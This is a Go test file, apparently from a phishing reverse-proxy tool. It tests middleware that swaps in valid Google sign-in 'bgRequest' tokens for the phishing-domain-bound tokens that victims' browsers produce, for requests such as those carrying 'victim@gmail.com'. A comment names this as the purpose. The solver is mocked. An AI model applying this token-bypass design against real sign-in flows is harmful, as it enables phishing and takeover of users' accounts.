package proxy

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/user/evilpikin/internal/puppet"
	"github.com/user/evilpikin/internal/storage"
)

func googlePuppetTarget() *storage.TargetProfile {
	return &storage.TargetProfile{
		ID:   "google",
		Name: "Google",
		EvilPuppet: &storage.EvilPuppetConfig{
			Enabled:  true,
			SolveURL: "https://accounts.google.com",
			Rules: []storage.EvilPuppetRule{
				{Path: "/v3/signin", TokenParam: "", Field: "identifier"},
			},
		},
	}
}

func TestPuppetGuardInjectsToken(t *testing.T) {
	eng := NewEngine()
	eng.SetPuppet(&puppet.MockSolver{})
	eng.hostRoutes["accounts.google.test"] = &hostRoute{target: googlePuppetTarget()}

	var got string
	final := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = r.URL.Query().Get("bgRequest")
		w.WriteHeader(200)
	})
	h := eng.puppetGuard(final)

	req := httptest.NewRequest("GET", "https://accounts.google.test/v3/signin/identifier?identifier=victim@gmail.com", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)

	if got != "MOCK_bgRequest" {
		t.Fatalf("expected injected MOCK_bgRequest, got %q", got)
	}
}

func TestPuppetGuardInjectsTokenIntoPostBody(t *testing.T) {
	eng := NewEngine()
	eng.SetPuppet(&puppet.MockSolver{})
	eng.hostRoutes["accounts.google.test"] = &hostRoute{target: googlePuppetTarget()}

	var gotParam, gotIdent string
	final := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		form, _ := url.ParseQuery(string(body))
		gotParam = form.Get("bgRequest")
		gotIdent = form.Get("identifier")
	})
	h := eng.puppetGuard(final)

	req := httptest.NewRequest("POST", "https://accounts.google.test/v3/signin/identifier",
		strings.NewReader("identifier=victim@gmail.com&passive=1"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	h.ServeHTTP(httptest.NewRecorder(), req)

	if gotParam != "MOCK_bgRequest" {
		t.Fatalf("expected token patched into POST body, got %q", gotParam)
	}
	if gotIdent != "victim@gmail.com" {
		t.Fatalf("expected original form field preserved, got %q", gotIdent)
	}
}

func TestPuppetGuardReplacesInvalidToken(t *testing.T) {
	eng := NewEngine()
	eng.SetPuppet(&puppet.MockSolver{})
	eng.hostRoutes["accounts.google.test"] = &hostRoute{target: googlePuppetTarget()}

	var got string
	final := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = r.URL.Query().Get("bgRequest")
	})
	h := eng.puppetGuard(final)

	// The victim's browser produced an (invalid, phishing-domain-bound) token;
	// the guard must replace it with a freshly minted valid one.
	req := httptest.NewRequest("GET", "https://accounts.google.test/v3/signin/identifier?identifier=victim@gmail.com&bgRequest=INVALID", nil)
	h.ServeHTTP(httptest.NewRecorder(), req)

	if got != "MOCK_bgRequest" {
		t.Fatalf("expected invalid token replaced with valid, got %q", got)
	}
}

func TestPuppetGuardInertWithoutSolver(t *testing.T) {
	eng := NewEngine() // no Puppet set
	eng.hostRoutes["accounts.google.test"] = &hostRoute{target: googlePuppetTarget()}
	called := false
	final := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { called = true })
	eng.puppetGuard(final).ServeHTTP(httptest.NewRecorder(), httptest.NewRequest("GET", "https://accounts.google.test/v3/signin/identifier?identifier=a@b.com", nil))
	if !called {
		t.Fatal("guard should pass through when no solver is configured")
	}
}
